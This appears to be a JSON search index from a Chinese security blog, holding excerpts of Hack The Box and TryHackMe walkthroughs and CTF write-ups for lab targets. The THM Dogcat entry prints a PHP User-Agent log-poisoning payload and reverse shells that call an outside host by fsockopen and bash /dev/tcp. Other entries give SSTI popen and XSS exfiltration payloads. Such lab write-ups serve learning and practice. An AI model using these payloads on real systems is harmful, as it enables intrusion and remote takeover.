[
  {
    "objectID": "da56469c5ea385b42bfc943db76f50284d1ced49",
    "permalink": "/post/htb-hercules/",
    "title": "HTB Hercules","content": " 靶机ip：10.10.11.91\n感谢lamber师傅提供的大致解题流程\n传送门：https://lamber-maybe.com/hackthebox/machines/hercules/\n知识点 kerberos pre_auth LDAP注入 NTLM反射 Shadow Credentials 攻击 ACL滥用 ADCS ESC3 基于资源的约束性委派 信息收集 Open 10.10.11.91:53 Open 10.10.11.91:80 Open 10.10.11.91:88 Open 10.10.11.91:135 Open 10.10.11.91:139 Open 10.10.11.91:389 Open 10.10.11.91:443 Open 10.10.11.91:445 Open 10.10.11.91:464 Open 10.10.11.91:593 Open 10.10.11.91:636 Open 10.10.11.91:3268 Open 10.10.11.91:3269 Open 10.10.11.91:5986 Open 10.10.11.91:9389 Open 10.10.11.91:49664 Open 10.10.11.91:49667 Open 10.10.11.91:49674 Open 10.10.11.91:49684 Open 10.10.11.91:56252 Open 10.10.11.91:56272 Open 10.10.11.91:64047 Web渗透 枚举用户名 页面没有任何信息，扫目录只有login，只能先枚举用户名\n先生成字典\nawk \u0026amp;#39;/^[[:space:]]*$/ {next} { gsub(/^[ \\t]+|[ \\t]+$/,\u0026amp;#34;\u0026amp;#34;); for(i=97;i\u0026amp;lt;=122;i++) printf \u0026amp;#34;%s.%c\\n\u0026amp;#34;, $0, i }\u0026amp;#39; /usr/share/seclists/Usernames/Names/names.txt | \\ sudo tee /usr/share/seclists/Usernames/Names/names.withletters.txt \u0026amp;gt; /dev/null \u0026amp;amp;\u0026amp;amp; \\ echo …","date": "2025-10-23 15:47:11",
    "updated": "2025-11-11 15:14:11"
  }, 
  {
    "objectID": "e8de0a16d1beb48011d4b80ef85a278bedc7a504",
    "permalink": "/post/htb-rebound/",
    "title": "HTB Rebound","content": " 靶机ip：10.10.11.231\n知识点 RID枚举 AS-REP Roasting 新型Kerberoasting 密码喷洒 ACL权限滥用 Shadow Credentials 攻击 利用RemotePotato0跨会话中继 ReadGMSAPassword 约束委派 基于资源的约束委派 PTH登录 信息收集 rustscan -a 10.10.11.231 -u 5000 .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-\u0026amp;#39; `-\u0026amp;#39;`-----\u0026amp;#39;`----\u0026amp;#39; `-\u0026amp;#39; `----\u0026amp;#39; `---\u0026amp;#39; `-\u0026amp;#39; `-\u0026amp;#39;`-\u0026amp;#39; `-\u0026amp;#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- TCP handshake? More like a friendly high-five! [~] The config file is expected to be at \u0026amp;#34;/root/.rustscan.toml\u0026amp;#34; [~] Automatically increasing ulimit value to 5000. Open 10.10.11.231:53 Open 10.10.11.231:88 Open 10.10.11.231:135 Open 10.10.11.231:139 Open 10.10.11.231:389 Open 10.10.11.231:445 Open 10.10.11.231:464 Open 10.10.11.231:593 Open 10.10.11.231:636 Open …","date": "2025-03-28 12:06:05",
    "updated": "2025-11-11 15:12:29"
  }, 
  {
    "objectID": "11951aced911a7f5602cd2e7d71c8209f922ff8f",
    "permalink": "/post/htb-manager/",
    "title": "HTB Manager","content": " 靶机ip：10.10.11.236\n知识点 SMB RID爆破 用户名密码爆破 xp_dirtree 枚举目录 ESC7提权 信息收集 ./rustscan -a 10.10.11.236 -u 5000 .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-\u0026amp;#39; `-\u0026amp;#39;`-----\u0026amp;#39;`----\u0026amp;#39; `-\u0026amp;#39; `----\u0026amp;#39; `---\u0026amp;#39; `-\u0026amp;#39; `-\u0026amp;#39;`-\u0026amp;#39; `-\u0026amp;#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- Open ports, closed hearts. [~] The config file is expected to be at \u0026amp;#34;/root/.rustscan.toml\u0026amp;#34; [~] Automatically increasing ulimit value to 5000. Open 10.10.11.236:53 Open 10.10.11.236:80 Open 10.10.11.236:88 Open 10.10.11.236:135 Open 10.10.11.236:139 Open 10.10.11.236:389 Open 10.10.11.236:445 Open 10.10.11.236:464 Open 10.10.11.236:593 Open 10.10.11.236:636 Open 10.10.11.236:1433 Open 10.10.11.236:3268 Open 10.10.11.236:3269 Open 10.10.11.236:5985 Open …","date": "2025-03-26 11:12:13",
    "updated": "2025-11-11 15:11:28"
  }, 
  {
    "objectID": "5234e84d21eebb4d8cb49f0c3fc23e4c29a05aa9",
    "permalink": "/post/htb-certified/",
    "title": "HTB Certified","content": " 靶机ip：10.10.11.41\n知识点 DACL滥用横向移动 Shadow Credentials 攻击 (no security extension)ESC9提权 信息收集 rustscan -a 10.10.11.41 -u 5000 .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-\u0026amp;#39; `-\u0026amp;#39;`-----\u0026amp;#39;`----\u0026amp;#39; `-\u0026amp;#39; `----\u0026amp;#39; `---\u0026amp;#39; `-\u0026amp;#39; `-\u0026amp;#39;`-\u0026amp;#39; `-\u0026amp;#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- Open ports, closed hearts. [~] The config file is expected to be at \u0026amp;#34;/root/.rustscan.toml\u0026amp;#34; [~] Automatically increasing ulimit value to 5000. Open 10.10.11.41:53 Open 10.10.11.41:88 Open 10.10.11.41:135 Open 10.10.11.41:139 Open 10.10.11.41:389 Open 10.10.11.41:445 Open 10.10.11.41:464 Open 10.10.11.41:593 Open 10.10.11.41:636 Open 10.10.11.41:3268 Open 10.10.11.41:3269 Open 10.10.11.41:5985 Open 10.10.11.41:9389 Open …","date": "2025-03-24 15:25:55",
    "updated": "2025-11-11 15:10:15"
  }, 
  {
    "objectID": "18479fa37fb57c17cf5945554d2693252651436e",
    "permalink": "/post/htb-authority/",
    "title": "HTB Authority","content": " 靶机ip：10.10.11.222\n知识点 ADCS枚举 ESC1提权 PassTheCert 信息收集 ./rustscan -a 10.10.11.222 -u 5000 .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-\u0026amp;#39; `-\u0026amp;#39;`-----\u0026amp;#39;`----\u0026amp;#39; `-\u0026amp;#39; `----\u0026amp;#39; `---\u0026amp;#39; `-\u0026amp;#39; `-\u0026amp;#39;`-\u0026amp;#39; `-\u0026amp;#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- I don\u0026amp;#39;t always scan ports, but when I do, I prefer RustScan. [~] The config file is expected to be at \u0026amp;#34;/root/.rustscan.toml\u0026amp;#34; [~] Automatically increasing ulimit value to 5000. Open 10.10.11.222:53 Open 10.10.11.222:80 Open 10.10.11.222:88 Open 10.10.11.222:135 Open 10.10.11.222:139 Open 10.10.11.222:389 Open 10.10.11.222:445 Open 10.10.11.222:464 Open 10.10.11.222:593 Open 10.10.11.222:636 Open 10.10.11.222:3268 Open 10.10.11.222:3269 Open 10.10.11.222:5985 Open …","date": "2025-03-20 12:51:09",
    "updated": "2025-11-11 15:05:42"
  }, 
  {
    "objectID": "8a08f09cb594a9ed019844446b635968ff9abbe2",
    "permalink": "/post/htb-escape/",
    "title": "HTB Escape","content": " 靶机ip：10.10.11.202\n知识点 mssql 利用 xp_dirtree 获取 NetNTLM hash ADCS枚举 ADCS ESC1提权 信息收集 使用rustscan 扫描端口\n./rustscan -a 10.10.11.202 -u 5000 .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-\u0026amp;#39; `-\u0026amp;#39;`-----\u0026amp;#39;`----\u0026amp;#39; `-\u0026amp;#39; `----\u0026amp;#39; `---\u0026amp;#39; `-\u0026amp;#39; `-\u0026amp;#39;`-\u0026amp;#39; `-\u0026amp;#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- 0day was here ♥ [~] The config file is expected to be at \u0026amp;#34;/root/.rustscan.toml\u0026amp;#34; [~] Automatically increasing ulimit value to 5000. Open 10.10.11.202:53 Open 10.10.11.202:88 Open 10.10.11.202:135 Open 10.10.11.202:139 Open 10.10.11.202:389 Open 10.10.11.202:445 Open 10.10.11.202:464 Open 10.10.11.202:593 Open 10.10.11.202:636 Open 10.10.11.202:1433 Open 10.10.11.202:3269 Open 10.10.11.202:3268 Open 10.10.11.202:5985 Open …","date": "2025-03-19 19:24:19",
    "updated": "2025-11-11 15:04:11"
  }, 
  {
    "objectID": "fc4b32fc31788f670d1e487818dd9af0dfaba185",
    "permalink": "/post/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-%E5%88%9D%E8%B5%9B/",
    "title": "第八届西湖论剑 初赛","content": " 签到 欢迎来到第八届西湖论剑大赛 Web Rank-l 但测试后存在部分过滤，随便上网找现成的 payload 打一下，发现能用。\nhttps://tttang.com/archive/1698/#toc_payload\n先看源码，发现黑名单\nUnicode 编码绕过即可\n{{x.__init__.__globals__[\u0026amp;#39;__builtins__\u0026amp;#39;][\u0026amp;#39;eval\u0026amp;#39;](\u0026amp;#34;__import__(\u0026amp;#39;os\u0026amp;#39;).popen(\u0026amp;#39;head+\\u002f\\u0066\\u006c\\u0061\\u0067\\u0066\\u0031\\u0034\\u0039\u0026amp;#39;).read()\u0026amp;#34;)}} sqli or not 给了源码，下面测试一下\nvar express = require(\u0026amp;#39;express\u0026amp;#39;); var app = express(); // 需要创建 express 实例 var router = express.Router(); // 创建路由实例 router.get(\u0026amp;#39;/\u0026amp;#39;, (req, res, next) =\u0026amp;gt; { if (req.query.info) { if (req.url.match(/\\,/ig)) { res.end(\u0026amp;#39;hacker1!\u0026amp;#39;); } var info = JSON.parse(req.query.info); console.log(\u0026amp;#39;Received info:\u0026amp;#39;, info); if (info.username \u0026amp;amp;\u0026amp;amp; info.password) { var username = info.username; var password = info.password; if (info.username.match(/\\\u0026amp;#39;|\\\u0026amp;#34;|\\\\/) || info.password.match(/\\\u0026amp;#39;|\\\u0026amp;#34;|\\\\/)) { res.end(\u0026amp;#39;hacker2!\u0026amp;#39;); } var sql = \u0026amp;#34;select * from userinfo where username = \u0026amp;#39;{username}\u0026amp;#39; and …","date": "2025-03-03 15:34:57",
    "updated": "2025-11-11 14:54:58"
  }, 
  {
    "objectID": "b788156f9b2eb05117342185b1bc7ec17bf7e799",
    "permalink": "/post/2024-ciscn-x-%E9%95%BF%E5%9F%8E%E6%9D%AF%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-%E5%88%9D%E8%B5%9B/",
    "title": "2024 CISCN X 长城杯铁人三项 初赛","content": " WEB Safe_Proxy 题目一进去就给了源码,里面是一个简单的 ssti,但是无回显不出网\nfrom flask import Flask, request, render_template_string import socket import threading import html app = Flask(__name__) @app.route(\u0026amp;#39;/\u0026amp;#39;, methods=[\u0026amp;#34;GET\u0026amp;#34;]) def source(): with open(__file__, \u0026amp;#39;r\u0026amp;#39;, encoding=\u0026amp;#39;utf-8\u0026amp;#39;) as f: return \u0026amp;#39;\u0026amp;lt;pre\u0026amp;gt;\u0026amp;#39;+html.escape(f.read())+\u0026amp;#39;\u0026amp;lt;/pre\u0026amp;gt;\u0026amp;#39; @app.route(\u0026amp;#39;/\u0026amp;#39;, methods=[\u0026amp;#34;POST\u0026amp;#34;]) def template(): template_code = request.form.get(\u0026amp;#34;code\u0026amp;#34;) # 安全过滤 blacklist = [\u0026amp;#39;__\u0026amp;#39;, \u0026amp;#39;import\u0026amp;#39;, \u0026amp;#39;os\u0026amp;#39;, \u0026amp;#39;sys\u0026amp;#39;, \u0026amp;#39;eval\u0026amp;#39;, \u0026amp;#39;subprocess\u0026amp;#39;, \u0026amp;#39;popen\u0026amp;#39;, \u0026amp;#39;system\u0026amp;#39;, \u0026amp;#39;\\r\u0026amp;#39;, \u0026amp;#39;\\n\u0026amp;#39;] for black in blacklist: if black in template_code: return \u0026amp;#34;Forbidden content detected!\u0026amp;#34; result = render_template_string(template_code) print(result) return \u0026amp;#39;ok\u0026amp;#39; if result is not None else \u0026amp;#39;error\u0026amp;#39; class HTTPProxyHandler: def __init__(self, target_host, target_port): self.target_host = target_host …","date": "2024-12-16 08:41:11",
    "updated": "2025-11-11 14:46:49"
  }, 
  {
    "objectID": "79d862c57cec9513787186ca0bfb580546dbbadc",
    "permalink": "/post/%E9%B9%8F%E5%9F%8E%E6%9D%AF-2024/",
    "title": "鹏城杯 2024","content": " Web python口算 访问题目看要求是要一秒答题，果断找gpt写脚本\nimport requests from bs4 import BeautifulSoup import re import time import fenjing # 主页面 URL url = \u0026amp;#34;http://192.168.18.28/\u0026amp;#34; calc_url = url + \u0026amp;#34;calc\u0026amp;#34; headers = { \u0026amp;#39;User-Agent\u0026amp;#39;: \u0026amp;#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\u0026amp;#39; } # 发起第一次请求，获取初始页面内容 response = requests.get(url, headers=headers) soup = BeautifulSoup(response.text, \u0026amp;#39;html.parser\u0026amp;#39;) # 检查 h1 标签内容 h1_text = soup.find(\u0026amp;#39;h1\u0026amp;#39;).get_text().strip() print(\u0026amp;#34;第一次请求内容:\u0026amp;#34;, h1_text) # 如果 h1 标签内容为 \u0026amp;#34;Are you ready for this?\u0026amp;#34;，等待一秒后检查新的内容 if h1_text == \u0026amp;#34;Are you ready for this?\u0026amp;#34;: time.sleep(1) # 等待 1 秒 # 第二次请求 /calc，模拟页面定时刷新后的情况 response = requests.get(calc_url, headers=headers) h1_text = response.text.strip() # 获取返回内容 # 检查返回内容是否为算术表达式 if re.match(r\u0026amp;#34;^[\\d\\+\\-\\*/\\s]+$\u0026amp;#34;, h1_text): print(\u0026amp;#34;算术表达式为：\u0026amp;#34;, h1_text) try: # 使用 eval 计算结果 result = eval(h1_text) print(\u0026amp;#34;计算结果为：\u0026amp;#34;, result) # 构造带有计算结果和 …","date": "2024-11-10 20:57:59",
    "updated": "2025-11-11 14:23:40"
  }, 
  {
    "objectID": "dbf01adea1830a5f6730cdfd429a8b896ee5d50d",
    "permalink": "/post/htb-freelancer/",
    "title": "HTB Freelancer","content": " 靶机ip：10.10.11.5\n知识点 MSSQL通过xp_cmdshell 实现RCE 密码喷洒 滥用GenericWrite RBCD约束委派 PTH传递攻击 信息收集 nmap扫描 nmap --min-rate 10000 -A -sV -sC -p- 10.10.11.5 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-30 19:20 CST Warning: 10.10.11.5 giving up on port because retransmission cap hit (10). sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.10.11.5, 16) =\u0026amp;gt; Operation not permitted Offending packet: TCP 10.10.16.4:35511 \u0026amp;gt; 10.10.11.5:8189 S ttl=44 id=31021 iplen=44 seq=2972970908 win=1024 \u0026amp;lt;mss 1460\u0026amp;gt; Nmap scan report for 10.10.11.5 Host is up (0.83s latency). Not shown: 59837 closed tcp ports (reset), 5672 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http nginx 1.25.5 |_http-title: Did not follow redirect to http://freelancer.htb/ |_http-server-header: nginx/1.25.5 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-30 16:21:28Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn …","date": "2024-10-30 19:15:05",
    "updated": "2025-11-10 17:00:59"
  }, 
  {
    "objectID": "80fd1e42fd018a40a4604850ac13809993edf0f8",
    "permalink": "/post/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-2024/",
    "title": "网鼎杯 青龙组 2024","content": " WEB WEB02： 访问该环境，登陆注册能随便登，会返回一个/content/hash作为路由，然后拿dirsearch扫一下只能发现一个flag路由，回显你是boss嘛？就想看其他无人机拟定执行任务？\n进这个路由之后有3按钮，提交，刷新，和更新，一开始一直在试拿fenjing梭ssti，然后不成功\n之后尝试写xss，发现存在存储型xss，之后尝试拿hackbar的xss一把梭一下，想弹到ceye.io上，咋弹都回显那个不是boss，我还以为是payload有问题，以为是要弹到当前路由\n之后看响应包，突然发现他的提交是点击提交当前页面，boss会审核你的起飞任务清单，所以使用submit提交后，就是直接boss审核的\n所以最后是需要我们把xss payload存储之后，点击submit，就是由boss提交的，然后就能把flag路由的回显输出到当前页面了\n\u0026amp;lt;script\u0026amp;gt; fetch(\u0026amp;#39;/flag\u0026amp;#39;).then(response =\u0026amp;gt; response.text()).then(data =\u0026amp;gt; { fetch(\u0026amp;#39;/content/2f9f1f36782a270b689d8c0f3e9e08df\u0026amp;#39;,{ method:\u0026amp;#39;POST\u0026amp;#39;, headers:{\u0026amp;#39;Content-Type\u0026amp;#39;:\u0026amp;#39;application/x-www-form-urlencoded\u0026amp;#39;}, body:\u0026amp;#34;content=123\u0026amp;#34;%2bdata }) }) \u0026amp;lt;/script\u0026amp;gt; PWN PWN02 首先是一个login的登录绕过，直接按照它的要求输就好了\n然后过到下面的vuln函数中去打溢出，这边眼瞅着的长度肯定不够，首先想到打栈迁移,给出后续地址之后直接打\n然后看到有给出完整后门，那么就好打了\n直接栈迁移打system\nfrom pwn import * context(os=\u0026amp;#39;linux\u0026amp;#39;,arch=\u0026amp;#39;i386\u0026amp;#39;,log_level=\u0026amp;#39;debug\u0026amp;#39;) libc=ELF(\u0026amp;#34;/lib/i386-linux-gnu/libc.so.6\u0026amp;#34;) elf=ELF(\u0026amp;#39;./pwn\u0026amp;#39;) …","date": "2024-10-30 18:03:36",
    "updated": "2025-11-11 14:18:06"
  }, 
  {
    "objectID": "4b2abd3caf8db9904405f1de9d3845aed84d079a",
    "permalink": "/post/htb-reel/",
    "title": "HTB Reel","content": " 靶机ip：10.10.10.77\n知识点 RTF钓鱼 ACL滥用-user-WriteOwner权限 ACL滥用-group-WriteDacl权限 信息收集 nmap扫描 nmap --min-rate 10000 -A -sV -sC -p- 10.10.10.77 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 13:44 CST Nmap scan report for 10.10.10.77 Host is up (0.76s latency). Not shown: 65527 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_05-28-18 11:19PM \u0026amp;lt;DIR\u0026amp;gt; documents 22/tcp open ssh OpenSSH 7.6 (protocol 2.0) | ssh-hostkey: | 2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA) | 256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA) |_ 256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519) 25/tcp open smtp? | smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, …","date": "2024-10-27 13:34:07",
    "updated": "2025-11-11 14:12:02"
  }, 
  {
    "objectID": "836ec1eb055ba73c9d04926627f639804ba9b90e",
    "permalink": "/post/thm-reset/",
    "title": "THM Reset","content": " 靶机ip：10.10.219.65\n信息收集 nmap扫描 nmap --min-rate 10000 -A -sV -sC -p- 10.10.219.65 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-25 13:49 CST Nmap scan report for 10.10.219.65 Host is up (0.63s latency). Not shown: 65515 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-25 05:50:16Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=HayStack.thm.corp | Not …","date": "2024-10-25 13:45:52",
    "updated": "2025-11-10 17:09:19"
  }, 
  {
    "objectID": "1dbffe65242a38aa1a8dc94cc98ef680c9efb311",
    "permalink": "/post/thm-enterprise/",
    "title": "THM Enterprise","content": " 靶机ip：10.10.76.81\n信息收集 nmap扫描 nmap --min-rate 10000 -A -sV -sC -p- 10.10.184.113 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-23 15:44 CST Warning: 10.10.184.113 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.184.113 Host is up (0.36s latency). Not shown: 59956 closed tcp ports (reset), 5552 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Site doesn\u0026amp;#39;t have a title (text/html). 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-23 07:44:58Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http …","date": "2024-10-23 15:42:46",
    "updated": "2025-11-11 14:05:02"
  }, 
  {
    "objectID": "3db9a496fb091252b9a9a280037e723bf588015f",
    "permalink": "/post/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-2024/",
    "title": "强网拟态 2024","content": " Web capoo (一血) 爽喽\nf12发现读的图片，感觉应该能任意文件读取，读一下/etc/passwd\n发现能读，再看一下环境变量/proc/1/environ，没有\n再看一下/proc/1/cmdline，发现存在/bin/sh/docker-entrypoint.sh\n再尝试一下start.sh\n找到flag名称，直接读就能出flag\nez_picker 源码：\nfrom sanic import Sanic from sanic.response import json, file as file_, text, redirect from sanic_cors import CORS from key import secret_key import os import pickle import time import jwt import io import builtins app = Sanic(\u0026amp;#34;App\u0026amp;#34;) pickle_file = \u0026amp;#34;data.pkl\u0026amp;#34; my_object = {} users = [] safe_modules = { \u0026amp;#39;math\u0026amp;#39;, \u0026amp;#39;datetime\u0026amp;#39;, \u0026amp;#39;json\u0026amp;#39;, \u0026amp;#39;collections\u0026amp;#39;, } safe_names = { \u0026amp;#39;sqrt\u0026amp;#39;, \u0026amp;#39;pow\u0026amp;#39;, \u0026amp;#39;sin\u0026amp;#39;, \u0026amp;#39;cos\u0026amp;#39;, \u0026amp;#39;tan\u0026amp;#39;, \u0026amp;#39;date\u0026amp;#39;, \u0026amp;#39;datetime\u0026amp;#39;, \u0026amp;#39;timedelta\u0026amp;#39;, \u0026amp;#39;timezone\u0026amp;#39;, \u0026amp;#39;loads\u0026amp;#39;, \u0026amp;#39;dumps\u0026amp;#39;, \u0026amp;#39;namedtuple\u0026amp;#39;, \u0026amp;#39;deque\u0026amp;#39;, \u0026amp;#39;Counter\u0026amp;#39;, \u0026amp;#39;defaultdict\u0026amp;#39; } class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module in safe_modules and name in safe_names: …","date": "2024-10-21 09:23:02",
    "updated": "2025-11-10 16:46:02"
  }, 
  {
    "objectID": "913c60a01f565181d37a894fa3e089a99ecab573",
    "permalink": "/post/thm-watcher/",
    "title": "THM Watcher","content": " 靶机ip：10.10.76.81\n信息收集 nmap扫描 nmap --min-rate 10000 -A -sV -sC -p- 10.10.76.81 发现开放21，22，80端口\n21端口 尝试一下匿名登录\n匿名登陆失败\n80端口 随便点击后发现在url处疑似存在文件包含，尝试利用一下\n/post.php?post=/etc/passwd\n此处确实存在文件包含\n再扫描一下目录\ngobuster dir -u http://10.10.76.81/ -w /usr/share/wordlists/dirb/common.txt robots.txt 找到俩文件\n其中一个是flag1\n另一个无法访问，但是可以用之前发现的文件包含读取文件\n/post.php?post=secret_file_do_not_read.txt\n发现另一重要目录/home/ftpuser/ftp/files，同时最后面像是一组用户名密码ftpuser:givemefiles777，再次尝试登录ftp\nftp ftpuser@10.10.76.81 登陆成功，并找到flag2\n同时files目录就是之前通过任意文件读取找到的目录\n获得初始访问权限 我们可以尝试一下，通过ftp上传的文件，我们知道其绝对路径，就可以通过文件读取进行利用\n先简单尝试一下，准备个php文件\n通过ftp上传文件\n此时文件的绝对路径就是/home/ftpuser/ftp/files/info.php\n再通过浏览器读取该文件\n成功读取，同时php代码也可以被解析，可以利用这个进行反弹shell\n准备好我们的webshell\n设置好ip和port\n将文件通过ftp上传到服务器上\n攻击机设置好监听\n浏览器读取并访问我们的shell文件\n/post.php?post=/home/ftpuser/ftp/files/php-reverse-shell.php\n拿到shell\n主机用户信息收集 我们已经获得了www-data权限，能够简单的访问服务器资源，我们需要更进一步的控制这台服务器，就需要继续提升我们的权限\n在/home/mat下，找到flag5，但是权限不够无法访问，但是可以查看note.txt\n发现可以使用脚本执行，查看一下\n先切换到交互式shell\npython3 -c \u0026amp;#39;import …","date": "2024-10-18 19:32:56",
    "updated": "2025-11-11 13:57:08"
  }, 
  {
    "objectID": "1f437f2fdd932e9c3644da4090d77bbf16e8b981",
    "permalink": "/post/thm-dogcat/",
    "title": "THM Dogcat","content": " 靶机ip：10.10.89.86\n信息收集 nmap扫描 nmap --min-rate 10000 -A -sV -sC -p- 10.10.89.86 发现开放22，80端口\n80端口 发现点击dog或者cat，会显示一张相应的图片\n先扫描一下目录\ngobuster dir -u http://10.10.89.86/ -w /usr/share/wordlists/dirb/common.txt 访问/cats显示403，除此之外并没有什么有用的信息\nLIF导致RCE 再次查看我们的页面\n在url处有个参数view，尝试一下目录穿越\n有效果，可以文件包含，并且默认在后面加.php文件后缀了\n测试后发现可以通过%00可以截断\n使用伪协议尝试读取源码\n?view=php://filter/convert.base64-encode/resource=dog base64解码一下\necho \u0026#34;PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K\u0026#34; | base64 -d 尝试读取一下别的文件\n?view=php://filter/convert.base64-encode/resource=dog/../index 发现解码后的代码，我们还可以控制ext变量，来控制文件后缀，所以我们就可以读取任意文件了\n先读取/etc/passwd\n?view=view=dog/../../../../etc/passwd\u0026amp;ext= 看源码比较清晰一点\n这里貌似没什么信息，查看一下日志\n?view=view=dog/../../../../../../../var/log/apache2/access.log\u0026amp;ext= 最终找到了apache2的日志\n在最后发现我们的操作会被记录下来，并且请求头的信息也保存了\n尝试更改请求头试一下\n我们自定义的请求头被写入到日志文件中了，尝试写入php代码\ncurl \u0026#34;http://10.10.89.86/\u0026#34; -H \u0026#34;User-Agent: \u0026lt;?php system(\u0026#39;whoami\u0026#39;)?\u0026gt;\u0026#34; 成功RCE！\n获得初始访问权限 先将RCE完善一下\ncurl \u0026#34;http://10.10.89.86/\u0026#34; -H \u0026#34;User-Agent: \u0026lt;?php system(\\$_GET[\u0026#39;cmd\u0026#39;]);?\u0026gt;\u0026#34; 可以执行命令，我们就尝试反弹shell，先建立个监听\n执行一下反弹shell命令（注意要url编码）\nphp -r \u0026#39;$sock=fsockopen(\u0026#34;10.14.90.122\u0026#34;, 8888);exec(\u0026#34;/bin/bash -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; 成功获取初始权限\n在当前页面找到flag.php\n提升至root权限 先找一下flag的位置\nfind / -name \u0026#34;*flag*\u0026#34; 2\u0026gt;/dev/null 找到flag2\nsudo -l查看一下\n发现env命令具有root权限，使用env命令提权\n获得root权限\n在/root下找到flag3.txt\ndocker逃逸 在根目录中找到.dockerenv文件\n可知我们在docker内\n仔细翻找文件后发现以上内容，仔细查看一下，发现像是备份文件的命令，过段时间后会发现backup.tar文件的修改时间改变了，推断出可能正在执行一个cron任务\n我们可以尝试写入反弹shell的命令，并以主机上的 root 身份获取 shell\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.14.90.122/8889 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt;\u0026gt; backup.sh 主机进行监听，过段时间后我们获取到了主机的shell\n成功获取主机shell\n在/root目录找到最后一个flag\n","date": "2024-10-18 14:52:51",
    "updated": "2025-11-11 13:48:59"
  }, 
  {
    "objectID": "02c703057ac69b10026c3b7b63ffe1e43c16a8b2",
    "permalink": "/post/thm-the-marketplace/",
